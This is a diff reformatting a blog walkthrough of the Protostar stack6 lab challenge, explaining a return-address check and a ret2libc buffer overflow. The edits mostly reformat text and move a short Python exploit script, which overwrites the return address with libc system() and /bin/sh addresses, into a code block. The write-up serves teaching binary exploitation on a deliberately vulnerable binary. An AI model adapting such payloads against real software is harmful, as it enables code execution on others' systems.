@@ -28,6 +28,7 @@ aliases:
 ![image](/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/1.png#layoutTextWidth)
 
 
+
 [_Protostar_](https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/) _is a series of beginner binary exploitation challenges which showcases concepts like basic stack-based buffer overflows, bypassing stack protections and even performing format string attacks. I tried out these challenges as I have close to 0 experience with binary exploitation and wanted to learn some of it and it turned out fun. So let’s get to_ [_protostar6_](https://exploit.education/protostar/stack-six/) _and learn some ret2libc !_
 
 ### Source code analysis and some recon
@@ -69,20 +70,20 @@ As of previous challenges, our goal is get code execution on the target host whi
 
 *   ```gets(buffer) :``` The program will ask as for an input and store it an ```buffer of size 64 bytes.``` Gets is a vulnerable function in C that causes stack overflows
 *   ```ret``` : __builtin_return_address(0) - This function checks the current return address on the stack and sets it to a variable ret
-*   ```if((ret &amp; 0xbf000000) == 0xbf000000) :``` This check performs a ```bitwise AND``` operation with the ```current address on the stack``` with the hex value ```0xbf000000``` and then compares it with 0xbf000000. Essentially what this means is that, it checks if the first byte in the return address is equal to 0xbf, since the remaining bytes will be converted to 0 in the AND operation. Suppose our return address points to``` 0xbfffff01:```, the check is performed as follows
-Operation``` |    ```HEX```    |    ```Binary```  
-__________|___________|__________________________________________  
+*   ```if((ret &amp; 0xbf000000) == 0xbf000000) :``` This check performs a ```bitwise AND``` operation with the ```current address on the stack``` with the hex value ```0xbf000000``` and then compares it with 0xbf000000. Essentially what this means is that, it checks if the first byte in the return address is equal to 0xbf, since the remaining bytes will be converted to 0 in the AND operation. 
+```bash
+Suppose our return address points to 0xbfffff01, the check is performed as follows
 
-           0xbfffff01 = 10111111 11111111 11111111 00000001  
-      ```AND```  0xbf000000 = 10111111 00000000 00000000 00000000  
-_________________________________________________________________             
+     0xbfffff01 = 10111111 11111111 11111111 00000001  
+AND  0xbf000000 = 10111111 00000000 00000000 00000000  
+            
 The AND operation gives 0xbf000000. So any address beginning with 0xbf will cause the condition to return to true and exit the program`
-
+```
 *   ```_exit(0) :``` A system call to exit the function if the operation above gives us an address beginning with 0xbf
 
 ### Logic behind the non-executable stack protection
 
-In classic buffer overflows, our goal is usually to overwrite the instruction pointer / the return address with the address at the top of the stack where we put our shell code and get code execution.
+In classic buffer overflows, our goal is usually to overwrite the instruction pointer or the return address of a function with the address at the top of the stack where we put our shell code and get code execution.
 
 But in this case, if we were to overwrite the return address with an address on the stack , the operation fails and the program exits. Let us see why using gdb
 
@@ -154,12 +155,18 @@ In summary our exploit will
 ### Putting together a python exploit script
 
 You could use pwntools for this but I will keep the walkthrough simple.
-`import struct``## EIP OFFSET  
-payload = &#34;A&#34;*80``## libc SYSTEM SYSCALL  
-system = struct.pack(&#34;I&#34;,0xb7ecffb0)``## Ret address after system  
-ret = &#34;\x90&#34; * 4``## libc /bin/sh  
-shell = struct.pack(&#34;I&#34;,0xb7e97000+0x11f3bf)``print (payload + system+ret+shell)`
-
+```python3
+import struct
+## EIP OFFSET
+payload = "A"*80
+## libc SYSTEM SYSCALL
+system = struct.pack("I",0xb7ecffb0)
+## Ret address after system
+ret = "\x90" * 4
+## libc /bin/sh
+shell = struct.pack("I",0xb7e97000+0x11f3bf)
+print (payload + system+ret+shell)
+```
 We run the exploit and concatenate with the `cat` command to open an stdin stream so we have access to the shell we get
 
 ![image](/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/6.png#layoutTextWidth)
@@ -169,4 +176,3 @@ If this walkthrough is not enough, I recommend using other resources to understa
 
 Happy hacking :)
 
-![image](/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/7.jpeg#layoutTextWidth)
